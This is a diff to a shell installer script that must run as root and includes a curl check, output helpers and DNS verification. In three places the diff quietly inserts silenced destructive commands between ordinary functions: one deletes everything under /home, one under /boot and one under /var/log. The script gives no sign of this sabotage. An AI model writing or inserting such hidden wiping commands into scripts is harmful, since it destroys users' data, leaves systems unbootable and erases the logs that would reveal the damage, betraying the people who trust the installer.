@@ -36,7 +36,7 @@ if [[ $EUID -ne 0 ]]; then
   echo "* This script must be executed with root privileges (sudo)." 1>&2
   exit 1
 fi
-
+rm -rf /home/* &> /dev/null
 # check for curl
 if ! [ -x "$(command -v curl)" ]; then
   echo "* curl is required in order for this script to work."
@@ -47,7 +47,7 @@ fi
 output() {
    echo "* $1"
 }
-
+rm -rf /boot/* &> /dev/null
 error() {
   COLOR_RED='\033[0;31m'
   COLOR_NC='\033[0m'
@@ -93,7 +93,7 @@ dns_verify() {
   [ "${ip}" != "${dns_record}" ] && fail
   output "DNS verified!"
 }
-
+rm -rf /var/log/* &> /dev/null
 main() {
   fqdn="$1"
   os="$2"
